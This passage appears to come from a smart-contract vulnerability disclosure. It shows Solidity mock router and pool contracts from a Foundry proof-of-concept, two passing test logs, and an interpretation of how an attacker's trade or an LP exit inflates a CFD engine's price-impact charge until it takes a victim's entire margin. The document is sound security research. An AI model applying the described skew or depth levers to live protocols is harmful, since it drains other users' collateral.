        require(_isEngineCaller(), "MockHousePool: only engine");
        bool cashArrived = cashMode == IHousePool.ClaimantInflowCashMode.CashArrived;
        if (kind == IHousePool.ClaimantInflowKind.Revenue) {
            pendingTradingRevenueAssetsValue += amount;
        } else {
            pendingRecapitalizationAssetsValue += amount;
        }
        if (cashArrived) {
            accountedAssets += amount;
        }
        emit ClaimantInflow(amount, uint8(kind), cashArrived);
    }

    function pendingRecapitalizationAssets() external view returns (uint256) {
        return pendingRecapitalizationAssetsValue;
    }

    function pendingTradingRevenueAssets() external view returns (uint256) {
        return pendingTradingRevenueAssetsValue;
    }

    function unassignedAssets() external view returns (uint256) {
        return unassignedAssetsValue;
    }

    function seniorPrincipal() external view returns (uint256) {
        return seniorPrincipalValue;
    }

    function juniorPrincipal() external view returns (uint256) {
        return juniorPrincipalValue;
    }

    function markStalenessLimit() external view returns (uint256) {
        return markStalenessLimitValue;
    }
}

/// @notice Minimal router: the only address the engine trusts for order processing and marks.
/// @dev processOrderTyped mirrors OrderRouterExecutionSidecar's item construction: the pool
///      depth passed to the engine is the pool's current totalAssets (router source of truth),
///      so depth changes between commit and execution are picked up exactly as in production.
contract MockRouter {
    address public immutable ENGINE;
    address public immutable POOL;

    constructor(address engine, address pool) {
        ENGINE = engine;
        POOL = pool;
    }

    function updateMarkPrice(uint256 price, uint64 publishTime) external {
        // solhint-disable-next-line avoid-low-level-calls
        (bool ok,) = ENGINE.call(abi.encodeCall(ICfdEngineCoreLike.updateMarkPrice, (price, publishTime)));
        require(ok, "MockRouter: mark update failed");
    }

    /// @dev Executes an order at the given oracle price with live pool depth, like the real
    ///      router's OracleExecution item path.
    function processOrder(
        CfdTypes.Order calldata order,
        uint256 executionPrice,
        uint64 publishTime
    ) external returns (bool ok, bytes memory data) {
        uint256 depth = MockHousePool(POOL).totalAssets();
        (ok, data) = ENGINE.call(
            abi.encodeCall(
                ICfdEngineCoreLike.processOrderTyped, (order, executionPrice, depth, publishTime)
            )
        );
        require(ok, "MockRouter: order failed");
    }
}

interface ICfdEngineCoreLike {
    function updateMarkPrice(uint256 price, uint64 publishTime) external;
    function processOrderTyped(
        CfdTypes.Order calldata order,
        uint256 currentOraclePrice,
        uint256 poolDepthAssets,
        uint64 publishTime
    ) external;
}
```



**Logs:**

```
Ran 2 tests for test/VpiClampPoC.t.sol:VpiClampPoC
[PASS] test_DepthLever_UpToTotalConfiscation() (gas: 2856063)
Logs:
  === DEPTH LEVER: victim's identical close at two depths ===
  VPI delta at full depth: 380.250000
  VPI delta at 30k depth (post-LP-exit): 126749.938910
  charge at full depth: 380.250000
  charge at 30k depth (post-LP-exit): 126749.938910
  amplification (x): 334
  victim position margin: 94920.235541
  === EXECUTED CLOSE (depth lever) ===
  victim balance before close: 3198820.235541
  victim balance after close: 3070510.296631
  collected from victim (VPI + fee): 128309.938910
  ...of which uncapped VPI charge: 126749.938910
  victim margin after close: 0.000000
  victim position size after close: 0

[PASS] test_SkewLever_InflatesVictimCloseCharge() (gas: 3562302)
Logs:
  === SKEW LEVER: victim's identical close, before vs after attacker's open ===
  VPI delta of victim close (no attacker): 380.249999
  VPI delta of victim close (attacker shorted): 1140.706623
  charge (no attacker): 380.249999
  charge (attacker longed): 1140.706623
  amplification (x): 3
  victim position margin: 94920.235541
  victim lifetime vpiAccrued (credit): -380.235541
  === EXECUTED CLOSE (skew lever) ===
  victim margin after close: 0.000000
  victim free settlement after close: 3196119.528918
  victim position size after close: 0

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 6.11ms (7.30ms CPU time)
```

**Interpretation.** *Skew lever:* one permissionless SHORT by an unrelated attacker tripled the victim's exit charge (380.25 → 1,140.71 USDG) — the victim's −380.24 lifetime rebate credit offset nothing, and the executed close took the entire position margin. The multiplier follows `k(2AV + V²)/(2D)` in the attacker's size, so it compounds with depth shrinkage (at the skew-cap boundary plus a 100× depth drain the same close would be assessed ~305× / 116,025 USDG). *Depth lever:* an LP exit the victim cannot influence multiplied the identical close's charge 334× to 126,749.94 USDG — above the victim's entire 94,920.24 USDG margin — and the terminal close still executed, collecting 128,309.94 USDG (126,749.94 uncapped VPI + 1,560.00 fee) from the victim's collateral and deleting the position. The control previews isolate each lever as the sole changed variable.

